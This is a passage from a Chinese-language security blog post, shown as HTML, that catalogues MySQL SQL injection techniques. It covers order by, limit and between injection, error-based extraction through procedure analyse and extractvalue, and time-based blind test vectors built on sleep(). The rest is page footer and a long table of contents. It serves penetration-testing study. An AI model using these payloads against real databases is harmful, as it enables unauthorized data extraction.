+</ol>
+<p>利用条件比较苛刻，需要整条语句在括号中，且前后字段数量一致</p>
+<pre class=" language-plain"><code class="language-plain">(select * from security.users order by id &#60;payload>);
+结果如下
+(select * from security.users order by id) union (select 1,2,3);
+
+上面这是理想类型，如果有`,`分割，利用如下
+
+(select * from security.users order by id, &#60;payload>);
+在 payload 中利用 null 不占位绕过，结果如下
+(select * from security.users order by id, NULL) union (select 1,2,3);</code></pre>
+<ol start="5">
+<li>procedure analyse</li>
+</ol>
+<p>一般是配合报错使用的，注意版本需求 <strong>version ∈ [5.5.x, 5.6)</strong></p>
+<pre class=" language-plain"><code class="language-plain">select * from mysql.user limit 0,1 procedure analyse(extractvalue(1, concat(0x1, user())),1);</code></pre>
+<ol start="6">
+<li>排序</li>
+</ol>
+<p>详见：<a href="https://xz.aliyun.com/t/5356#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/5356#toc-2</a><br>建议：非关键位使用<code>0x0</code>避免影响</p>
+<h3 id="between-注入"><a href="#between-注入" class="headerlink" title="between 注入"></a>between 注入</h3><p>有点像INTERVAL，但是可作用的类型更多</p>
+<pre class=" language-plain"><code class="language-plain">mysql> select rpad(user(),1,0x0) between 'r' and 'r';</code></pre>
+<h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><pre class=" language-plain"><code class="language-plain">[LIMIT {[offset,] row_count | row_count OFFSET offset}]
+[PROCEDURE procedure_name(argument_list)]
+[INTO OUTFILE 'file_name'
+    [CHARACTER SET charset_name]
+    export_options
+  | INTO DUMPFILE 'file_name'
+  | INTO var_name [, var_name]]
+[FOR UPDATE | LOCK IN SHARE MODE]]</code></pre>
+<p>看语法 limit 后面可以利用 procedure、into函数。其中 into 按<code>文件操作</code>小节利用即可，procedure按上面<code>order by注入</code>利用即可</p>
+<h3 id="未知字段绕过"><a href="#未知字段绕过" class="headerlink" title="未知字段绕过"></a>未知字段绕过</h3><p><a href="https://www.bodkin.ren/index.php/archives/166/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/166/</a></p>
+<h2 id="测试向量"><a href="#测试向量" class="headerlink" title="测试向量"></a>测试向量</h2><pre class=" language-plain"><code class="language-plain">if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"'*/
+1111-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)</code></pre>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/key-column-usage-table.html" target="_blank" rel="noopener">https://www.docs4dev.com/docs/zh/mysql/5.7/reference/key-column-usage-table.html</a></p>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://blog.sari3l.com">Sariel.D</a>
+            <p>原文链接：<a href="https://blog.sari3l.com/posts/9622f295/">https://blog.sari3l.com/posts/9622f295/</a>
+            <p>发表日期：<a href="https://blog.sari3l.com/posts/9622f295/">September 12th 2019, 9:12:11 pm</a>
+            <p>更新日期：<a href="https://blog.sari3l.com/posts/9622f295/">July 6th 2020, 5:45:15 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/posts/a3557ae1/" title= "记">
+                    <div class="nextTitle">记</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/posts/a62f29f1/" title= "XSS with ServiceWorkers">
+                    <div class="prevTitle">XSS with ServiceWorkers</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:master@mail.sari3l.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/sari3l" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.instagram.com/x3rias" class="iconfont-archer instagram" target="_blank" title=instagram></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-number">1.</span> <span class="toc-text">SQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-注入常用表、目标字段"><span class="toc-number">2.</span> <span class="toc-text">0x01 注入常用表、目标字段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#可查字段"><span class="toc-number">2.1.</span> <span class="toc-text">可查字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-常见函数"><span class="toc-number">3.</span> <span class="toc-text">0x02 常见函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#条件"><span class="toc-number">3.1.</span> <span class="toc-text">条件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#if、when-case"><span class="toc-number">3.1.1.</span> <span class="toc-text">if、when case</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ifnull"><span class="toc-number">3.1.2.</span> <span class="toc-text">ifnull</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nullif"><span class="toc-number">3.1.3.</span> <span class="toc-text">nullif</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符串操作"><span class="toc-number">3.2.</span> <span class="toc-text">字符串操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查找"><span class="toc-number">3.2.1.</span> <span class="toc-text">查找</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#elt-区间分组"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">elt 区间分组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#make-set"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">make_set</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FIELD"><span class="toc-number">3.2.1.3.</span> <span class="toc-text">FIELD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FIND-IN-SET"><span class="toc-number">3.2.1.4.</span> <span class="toc-text">FIND_IN_SET</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分割函数"><span class="toc-number">3.2.2.</span> <span class="toc-text">分割函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扩展函数"><span class="toc-number">3.2.3.</span> <span class="toc-text">扩展函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#rpad"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">rpad</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#repeat"><span class="toc-number">3.2.3.2.</span> <span class="toc-text">repeat</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#比较函数"><span class="toc-number">3.3.</span> <span class="toc-text">比较函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#INTERVAL"><span class="toc-number">3.3.0.1.</span> <span class="toc-text">INTERVAL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#类型转换"><span class="toc-number">3.4.</span> <span class="toc-text">类型转换</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cast"><span class="toc-number">3.4.1.</span> <span class="toc-text">cast</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#convert"><span class="toc-number">3.4.2.</span> <span class="toc-text">convert</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间函数"><span class="toc-number">3.5.</span> <span class="toc-text">时间函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-number">3.5.1.</span> <span class="toc-text">sleep</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息函数"><span class="toc-number">3.6.</span> <span class="toc-text">信息函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#benchmark"><span class="toc-number">3.6.1.</span> <span class="toc-text">benchmark</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件操作"><span class="toc-number">3.7.</span> <span class="toc-text">文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#into-dumpfile"><span class="toc-number">3.7.1.</span> <span class="toc-text">into dumpfile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#into-outfile"><span class="toc-number">3.7.2.</span> <span class="toc-text">into outfile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#load-file"><span class="toc-number">3.7.3.</span> <span class="toc-text">load_file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#load-data"><span class="toc-number">3.7.4.</span> <span class="toc-text">load data</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正则匹配"><span class="toc-number">3.8.</span> <span class="toc-text">正则匹配</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#REGEXP、RLIKE"><span class="toc-number">3.8.1.</span> <span class="toc-text">REGEXP、RLIKE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#不同版本下神奇的问题"><span class="toc-number">3.8.1.1.</span> <span class="toc-text">不同版本下神奇的问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储过程"><span class="toc-number">3.9.</span> <span class="toc-text">存储过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#procedure-analyse"><span class="toc-number">3.9.1.</span> <span class="toc-text">procedure analyse</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-常见注入方式"><span class="toc-number">4.</span> <span class="toc-text">0x03 常见注入方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔型"><span class="toc-number">4.1.</span> <span class="toc-text">布尔型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错型"><span class="toc-number">4.2.</span> <span class="toc-text">报错型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#主键重复"><span class="toc-number">4.2.1.</span> <span class="toc-text">主键重复</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#floor"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">floor</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#round"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">round</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列名重复"><span class="toc-number">4.2.2.</span> <span class="toc-text">列名重复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#name-const"><span class="toc-number">4.2.3.</span> <span class="toc-text">name_const</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#join"><span class="toc-number">4.2.4.</span> <span class="toc-text">join</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据溢出"><span class="toc-number">4.2.5.</span> <span class="toc-text">数据溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#BIGINT"><span class="toc-number">4.2.5.1.</span> <span class="toc-text">BIGINT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DOUBLE"><span class="toc-number">4.2.5.2.</span> <span class="toc-text">DOUBLE</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1e308"><span class="toc-number">4.2.5.2.1.</span> <span class="toc-text">1e308</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#cot"><span class="toc-number">4.2.5.2.2.</span> <span class="toc-text">cot</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exp"><span class="toc-number">4.2.5.2.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#pow"><span class="toc-number">4.2.5.2.4.</span> <span class="toc-text">pow</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#几何对象"><span class="toc-number">4.2.6.</span> <span class="toc-text">几何对象</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#geometrycollection"><span class="toc-number">4.2.6.1.</span> <span class="toc-text">geometrycollection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#linestring"><span class="toc-number">4.2.6.2.</span> <span class="toc-text">linestring</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#multipoint"><span class="toc-number">4.2.6.3.</span> <span class="toc-text">multipoint</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#multipolygon"><span class="toc-number">4.2.6.4.</span> <span class="toc-text">multipolygon</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#multilinestring"><span class="toc-number">4.2.6.5.</span> <span class="toc-text">multilinestring</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#polygon"><span class="toc-number">4.2.6.6.</span> <span class="toc-text">polygon</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#空间函数Geohash"><span class="toc-number">4.2.7.</span> <span class="toc-text">空间函数Geohash</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ST-LatFromGeoHash"><span class="toc-number">4.2.7.1.</span> <span class="toc-text">ST_LatFromGeoHash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ST-LongFromGeoHash"><span class="toc-number">4.2.7.2.</span> <span class="toc-text">ST_LongFromGeoHash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ST-PointFromGeoHash"><span class="toc-number">4.2.7.3.</span> <span class="toc-text">ST_PointFromGeoHash</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GTID"><span class="toc-number">4.2.8.</span> <span class="toc-text">GTID</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#gtid-subset"><span class="toc-number">4.2.8.1.</span> <span class="toc-text">gtid_subset</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#gtid-subtract"><span class="toc-number">4.2.8.2.</span> <span class="toc-text">gtid_subtract</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON"><span class="toc-number">4.2.9.</span> <span class="toc-text">JSON</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#构造异常-json-doc"><span class="toc-number">4.2.9.1.</span> <span class="toc-text">构造异常 json_doc</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#json-merge"><span class="toc-number">4.2.9.1.1.</span> <span class="toc-text">json_merge</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#多种构造"><span class="toc-number">4.2.9.2.</span> <span class="toc-text">多种构造</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#json-remove"><span class="toc-number">4.2.9.2.1.</span> <span class="toc-text">json_remove</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-array-insert"><span class="toc-number">4.2.9.2.2.</span> <span class="toc-text">json_array_insert</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-array-append"><span class="toc-number">4.2.9.2.3.</span> <span class="toc-text">json_array_append</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-insert"><span class="toc-number">4.2.9.2.4.</span> <span class="toc-text">json_insert</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-keys"><span class="toc-number">4.2.9.2.5.</span> <span class="toc-text">json_keys</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-replace"><span class="toc-number">4.2.9.2.6.</span> <span class="toc-text">json_replace</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-set"><span class="toc-number">4.2.9.2.7.</span> <span class="toc-text">json_set</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UUID"><span class="toc-number">4.2.10.</span> <span class="toc-text">UUID</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#bin-to-uuid"><span class="toc-number">4.2.10.1.</span> <span class="toc-text">bin_to_uuid</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#uuid-to-bin"><span class="toc-number">4.2.10.2.</span> <span class="toc-text">uuid_to_bin</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XPATH"><span class="toc-number">4.2.11.</span> <span class="toc-text">XPATH</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#make-set-1"><span class="toc-number">4.2.11.0.1.</span> <span class="toc-text">make_set</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue"><span class="toc-number">4.2.11.1.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml"><span class="toc-number">4.2.11.2.</span> <span class="toc-text">updatexml</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询注入"><span class="toc-number">4.3.</span> <span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆叠注入-多语句查询注入"><span class="toc-number">4.4.</span> <span class="toc-text">堆叠注入&#x2F;多语句查询注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于时间延迟注入"><span class="toc-number">4.5.</span> <span class="toc-text">基于时间延迟注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep-1"><span class="toc-number">4.5.1.</span> <span class="toc-text">sleep</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#笛卡尔积"><span class="toc-number">4.5.2.</span> <span class="toc-text">笛卡尔积</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#benchmark-1"><span class="toc-number">4.5.3.</span> <span class="toc-text">benchmark</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#REGEXP、RLIKE-1"><span class="toc-number">4.5.4.</span> <span class="toc-text">REGEXP、RLIKE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-lock"><span class="toc-number">4.5.5.</span> <span class="toc-text">get_lock</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-其他姿势"><span class="toc-number">5.</span> <span class="toc-text">0x04 其他姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#order-by-注入"><span class="toc-number">5.1.</span> <span class="toc-text">order by 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常规姿势"><span class="toc-number">5.1.1.</span> <span class="toc-text">常规姿势</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#常见配合语句"><span class="toc-number">5.1.2.</span> <span class="toc-text">常见配合语句</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#between-注入"><span class="toc-number">5.2.</span> <span class="toc-text">between 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#limit-注入"><span class="toc-number">5.3.</span> <span class="toc-text">limit 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#未知字段绕过"><span class="toc-number">5.4.</span> <span class="toc-text">未知字段绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试向量"><span class="toc-number">6.</span> <span class="toc-text">测试向量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">7.</span> <span class="toc-text">参考资料</span></a></li></ol> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-text">SQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-注入常用表、目标字段"><span class="toc-text">0x01 注入常用表、目标字段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#可查字段"><span class="toc-text">可查字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-常见函数"><span class="toc-text">0x02 常见函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#条件"><span class="toc-text">条件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#if、when-case"><span class="toc-text">if、when case</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ifnull"><span class="toc-text">ifnull</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nullif"><span class="toc-text">nullif</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符串操作"><span class="toc-text">字符串操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查找"><span class="toc-text">查找</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#elt-区间分组"><span class="toc-text">elt 区间分组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#make-set"><span class="toc-text">make_set</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FIELD"><span class="toc-text">FIELD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FIND-IN-SET"><span class="toc-text">FIND_IN_SET</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分割函数"><span class="toc-text">分割函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扩展函数"><span class="toc-text">扩展函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#rpad"><span class="toc-text">rpad</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#repeat"><span class="toc-text">repeat</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#比较函数"><span class="toc-text">比较函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#INTERVAL"><span class="toc-text">INTERVAL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#类型转换"><span class="toc-text">类型转换</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cast"><span class="toc-text">cast</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#convert"><span class="toc-text">convert</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间函数"><span class="toc-text">时间函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-text">sleep</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息函数"><span class="toc-text">信息函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#benchmark"><span class="toc-text">benchmark</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件操作"><span class="toc-text">文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#into-dumpfile"><span class="toc-text">into dumpfile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#into-outfile"><span class="toc-text">into outfile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#load-file"><span class="toc-text">load_file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#load-data"><span class="toc-text">load data</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正则匹配"><span class="toc-text">正则匹配</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#REGEXP、RLIKE"><span class="toc-text">REGEXP、RLIKE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#不同版本下神奇的问题"><span class="toc-text">不同版本下神奇的问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储过程"><span class="toc-text">存储过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#procedure-analyse"><span class="toc-text">procedure analyse</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-常见注入方式"><span class="toc-text">0x03 常见注入方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔型"><span class="toc-text">布尔型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错型"><span class="toc-text">报错型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#主键重复"><span class="toc-text">主键重复</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#floor"><span class="toc-text">floor</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#round"><span class="toc-text">round</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列名重复"><span class="toc-text">列名重复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#name-const"><span class="toc-text">name_const</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#join"><span class="toc-text">join</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据溢出"><span class="toc-text">数据溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#BIGINT"><span class="toc-text">BIGINT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DOUBLE"><span class="toc-text">DOUBLE</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1e308"><span class="toc-text">1e308</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#cot"><span class="toc-text">cot</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#pow"><span class="toc-text">pow</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#几何对象"><span class="toc-text">几何对象</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#geometrycollection"><span class="toc-text">geometrycollection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#linestring"><span class="toc-text">linestring</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#multipoint"><span class="toc-text">multipoint</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#multipolygon"><span class="toc-text">multipolygon</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#multilinestring"><span class="toc-text">multilinestring</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#polygon"><span class="toc-text">polygon</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#空间函数Geohash"><span class="toc-text">空间函数Geohash</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ST-LatFromGeoHash"><span class="toc-text">ST_LatFromGeoHash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ST-LongFromGeoHash"><span class="toc-text">ST_LongFromGeoHash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ST-PointFromGeoHash"><span class="toc-text">ST_PointFromGeoHash</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GTID"><span class="toc-text">GTID</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#gtid-subset"><span class="toc-text">gtid_subset</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#gtid-subtract"><span class="toc-text">gtid_subtract</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON"><span class="toc-text">JSON</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#构造异常-json-doc"><span class="toc-text">构造异常 json_doc</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#json-merge"><span class="toc-text">json_merge</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#多种构造"><span class="toc-text">多种构造</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#json-remove"><span class="toc-text">json_remove</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-array-insert"><span class="toc-text">json_array_insert</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-array-append"><span class="toc-text">json_array_append</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-insert"><span class="toc-text">json_insert</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-keys"><span class="toc-text">json_keys</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-replace"><span class="toc-text">json_replace</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#json-set"><span 